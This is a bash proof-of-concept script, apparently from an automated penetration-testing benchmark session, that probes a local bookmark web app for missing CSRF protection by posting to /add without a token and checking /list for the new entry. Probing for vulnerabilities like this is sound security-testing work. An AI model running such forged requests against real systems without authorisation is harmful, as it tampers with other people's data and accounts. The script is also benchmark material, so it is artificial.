#!/bin/bash
# POC: Demonstrates CSRF vulnerability on bookmark creation endpoint by creating a bookmark without CSRF token
# Target: ./repo
# Created: 2025-11-07T19:36:37.467Z
# Session: benchmark-XBEN-075-24-mhp935fu

# CSRF Vulnerability POC: Missing CSRF Protection on Bookmark Creation
# This script demonstrates that the /add endpoint accepts POST requests
# without requiring CSRF tokens, allowing attackers to forge requests

TARGET_URL="http://127.0.0.1:5000"
ADD_ENDPOINT="$TARGET_URL/add"

echo "[*] CSRF POC: Missing CSRF Protection on Bookmark Creation"
echo "[*] Target: $ADD_ENDPOINT"
echo ""

# Step 1: Check if GET /add returns CSRF token
echo "[+] Step 1: Fetching /add form to check for CSRF token..."
FORM_RESPONSE=$(curl -s "$ADD_ENDPOINT")
CSRF_TOKEN=$(echo "$FORM_RESPONSE" | grep -i 'csrf' || true)

if [ -z "$CSRF_TOKEN" ]; then
    echo "[!] VULNERABLE: No CSRF token found in form"
else
    echo "[*] Found CSRF token: $CSRF_TOKEN"
fi
echo ""

# Step 2: Attempt POST request without CSRF token
echo "[+] Step 2: Attempting POST request WITHOUT CSRF token..."
POST_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$ADD_ENDPOINT" \
  -d "name=CSRF_Test_Bookmark&url=https://csrf-vulnerability-test.com")

HTTP_CODE=$(echo "$POST_RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$POST_RESPONSE" | head -n-1)

echo "[*] HTTP Status: $HTTP_CODE"
echo "[*] Response: $RESPONSE_BODY"
echo ""

# Step 3: Verify bookmark was created without CSRF token
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo "[!] VULNERABLE: POST request accepted without CSRF token!"
    echo "[!] HTTP $HTTP_CODE response indicates successful bookmark creation"
    echo ""
    
    # Try to verify by listing bookmarks
    echo "[+] Step 3: Checking if bookmark was created by listing all bookmarks..."
    LIST_RESPONSE=$(curl -s "$TARGET_URL/list")
    
    if echo "$LIST_RESPONSE" | grep -q "csrf-vulnerability-test.com"; then
        echo "[!] CONFIRMED VULNERABLE: Bookmark was created without CSRF token"
        exit 0
    else
        echo "[*] Could not verify bookmark creation (may be filtered in list view)"
        echo "[!] However, POST was accepted with HTTP $HTTP_CODE - CSRF vulnerability exists"
        exit 0
    fi
else
    echo "[*] POST request rejected with HTTP $HTTP_CODE"
    echo "[*] CSRF protection may be in place"
    exit 1
fi